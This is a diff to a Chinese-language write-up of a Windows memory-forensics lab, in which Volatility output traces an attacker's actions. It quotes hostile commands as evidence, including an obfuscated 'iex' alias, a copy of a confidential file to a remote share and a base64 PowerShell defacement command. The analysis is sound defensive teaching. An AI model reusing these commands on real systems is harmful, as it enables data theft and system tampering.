@@ -21,7 +21,7 @@ A junior member of our security team has been performing research and testing on
 
 Volatility2
 
-```shell title="python2 ./volatility-master/vol.py -f recollection.bin imageinfo"
+```bash title="python2 ./volatility-master/vol.py -f recollection.bin imageinfo"
 Volatility Foundation Volatility Framework 2.6.1
 INFO    : volatility.debug    : Determining profile based on KDBG search...
 WARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present in vtypes
@@ -44,7 +44,7 @@ WARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present in vty
 
 Volatility3
 
-```shell title="vol -f recollection.bin windows.info"
+```bash title="vol -f recollection.bin windows.info"
 Kernel Base     0xf8000285c000
 DTB     0x187000
 Symbols file:///home/randark/.local/lib/python3.10/site-packages/volatility3/symbols/windows/ntkrnlmp.pdb/DADDB88936DE450292977378F364B110-1.json.xz
@@ -88,7 +88,7 @@ Windows 7
 
 > 在攻击者获得对机器的访问权限后，攻击者将一个混淆的 PowerShell 命令复制到了剪贴板上。这个命令是什么？
 
-```shell title="python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 clipboard"
+```bash title="python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 clipboard"
 Volatility Foundation Volatility Framework 2.6.1
 Session    WindowStation Format                         Handle Object             Data
 ---------- ------------- ------------------ ------------------ ------------------ --------------------------------------------------
@@ -106,7 +106,7 @@ Session    WindowStation Format                         Handle Object           
 
 > 攻击者复制了混淆命令，将其用作 PowerShell 命令的别名。这个命令的名称是什么？
 
-```shell title="python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 consoles"
+```bash title="python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 consoles"
 Volatility Foundation Volatility Framework 2.6.1
 **************************************************
 ConsoleProcess: conhost.exe Pid: 3524
@@ -267,7 +267,7 @@ PS C:\Users\user>
 
 在其中关注到
 
-```shell
+```bash
 PS C:\Users\user> (gv '*MDR*').naMe[3,11,2]-joIN''
 iex
 ```
@@ -290,7 +290,7 @@ type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt
 
 > 在上述命令之后，请告诉我们文件是否成功被渗透出去了？
 
-```shell title="python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 consoles"
+```bash title="python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 consoles"
 PS C:\Users\user> type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\passtxt
 The network path was not found.
 At line:1 char:47
@@ -309,7 +309,7 @@ No
 
 在 `Task 4` 中就有
 
-```shell
+```bash
 powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
 ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi
 echo "hacked by mafia" > "C:\Users\Public\Office\readme.txt"
@@ -323,7 +323,7 @@ C:\Users\Public\Office\readme.txt
 
 > 机器的主机名是什么？
 
-```shell title="python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 hivelist"
+```bash title="python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 hivelist"
 Volatility Foundation Volatility Framework 2.6.1
 Virtual            Physical           Name
 ------------------ ------------------ ----
@@ -344,7 +344,7 @@ Virtual            Physical           Name
 
 定位到 `\REGISTRY\MACHINE\SYSTEM`
 
-```shell title="python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 printkey -o 0xfffff8a000024010 -K'ControlSet001\Control\ComputerName\ComputerName'"
+```bash title="python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 printkey -o 0xfffff8a000024010 -K'ControlSet001\Control\ComputerName\ComputerName'"
 Volatility Foundation Volatility Framework 2.6.1
 Legend: (S) = Stable   (V) = Volatile
 
@@ -368,7 +368,7 @@ REG_SZ        ComputerName    : (S) USER-PC
 
 > 机器上有多少个用户账户？
 
-```shell title="python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 consoles"
+```bash title="python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 consoles"
 PS C:\Users\user> net users
 
 User accounts for \\USER-PC
@@ -386,7 +386,7 @@ The command completed successfully.
 
 > 在 "\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge" 文件夹中，有一些子文件夹，其中有一个名为 passwords.txt 的文件。这个文件的完整位置 / 路径是什么？
 
-```shell title='python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 filescan | grep"Microsoft"| grep"Edge"| grep"passwords"'
+```bash title='python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 filescan | grep"Microsoft"| grep"Edge"| grep"passwords"'
 Volatility Foundation Volatility Framework 2.6.1
 0x000000011fc10070      1      0 R--rw- \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt
 ```
@@ -399,7 +399,7 @@ Volatility Foundation Volatility Framework 2.6.1
 
 > 使用命令执行了一个恶意可执行文件。这个可执行的 EXE 文件的名称是其自身的哈希值。这个哈希值是什么？
 
-```shell title="python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 consoles"
+```bash title="python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 consoles"
 ......
 Cmd #5 at 0xc2ee0: .\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
 ```
@@ -414,7 +414,7 @@ b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1
 
 首先，先定位到这个文件
 
-```shell title='python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 filescan | grep"b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1"'
+```bash title='python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 filescan | grep"b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1"'
 Volatility Foundation Volatility Framework 2.6.1
 0x000000011ee95460     12      0 R--rw- \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.zip
 0x000000011fa45c20     16      0 -W-r-- \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
@@ -423,7 +423,7 @@ Volatility Foundation Volatility Framework 2.6.1
 
 然后将文件提取出来
 
-```shell title="python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 dumpfiles -Q 0x000000011fa45c20 -n -D ./"
+```bash title="python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 dumpfiles -Q 0x000000011fa45c20 -n -D ./"
 Volatility Foundation Volatility Framework 2.6.1
 ImageSectionObject 0x11fa45c20   None   \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
 DataSectionObject 0x11fa45c20   None   \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
@@ -443,7 +443,7 @@ d3b592cd9481e4f053b5362e22d61595
 
 根据 `exiftools` 的分析结果
 
-```shell title="exiftool file.None.0xfffffa8003b62990.b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe.dat"
+```bash title="exiftool file.None.0xfffffa8003b62990.b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe.dat"
 ExifTool Version Number         : 12.40
 File Name                       : file.None.0xfffffa8003b62990.b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe.dat
 Directory                       : .
@@ -485,7 +485,7 @@ File Subtype                    : 0
 
 > 机器的本地 IP 地址是什么？
 
-```shell title="python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 netscan"
+```bash title="python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 netscan"
 Volatility Foundation Volatility Framework 2.6.1
 Offset(P)          Proto    Local Address                  Foreign Address      State            Pid      Owner          Created
 0x11e01f750        UDPv4    127.0.0.1:1900                 *:*                                   1248     svchost.exe    2022-12-19 15:34:44 UTC+0000
@@ -516,7 +516,7 @@ Offset(P)          Proto    Local Address                  Foreign Address      
 
 > 有多个 PowerShell 进程，其中一个进程是另一个进程的子进程。它的父进程是哪个进程？
 
-```shell title="python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 pstree"
+```bash title="python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 pstree"
 Volatility Foundation Volatility Framework 2.6.1
 Name                                                  Pid   PPid   Thds   Hnds Time
 -------------------------------------------------- ------ ------ ------ ------ ----
@@ -574,7 +574,7 @@ cmd.exe
 
 > 攻击者可能使用了一个电子邮件地址来登录社交媒体。你能告诉我们这个电子邮件地址是什么？
 
-```shell title='strings recollection.bin | grep"mail"| grep -E"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}"'
+```bash title='strings recollection.bin | grep"mail"| grep -E"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}"'
 ......
 ```
 
@@ -588,7 +588,7 @@ mafia_code1337@gmail.com
 
 首先，先查找保存历史记录的文件
 
-```shell title='python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 filescan | grep -i"history"'
+```bash title='python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 filescan | grep -i"history"'
 Volatility Foundation Volatility Framework 2.6.1
 0x000000011de6e9c0     16      0 R--rw- \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\Default\History-journal
 0x000000011deb9220     18      1 RW-rw- \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\Default\Nurturing\campaign_history
@@ -600,7 +600,7 @@ Volatility Foundation Volatility Framework 2.6.1
 
 然后将历史记录的文件提取出来
 
-```shell title='python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 dumpfiles -Q 0x000000011e0d16f0 -D ./'
+```bash title='python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 dumpfiles -Q 0x000000011e0d16f0 -D ./'
 Volatility Foundation Volatility Framework 2.6.1
 DataSectionObject 0x11e0d16f0   None   \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\Default\History
 SharedCacheMap 0x11e0d16f0   None   \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\Default\History
@@ -627,7 +627,7 @@ Wazuh
 
 首先，先定位文件
 
-```shell title='python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 filescan | grep -i"Downloads"'
+```bash title='python2 ./volatility-master/vol.py -f recollection.bin --profile=Win7SP1x64 filescan | grep -i"Downloads"'
 Volatility Foundation Volatility Framework 2.6.1
 0x000000011dff8aa0      2      1 R--rwd \Device\HarddiskVolume2\Users\user\Downloads
 0x000000011e0ee070     16      0 R--rw- \Device\HarddiskVolume2\Users\user\Links\Downloads.lnk
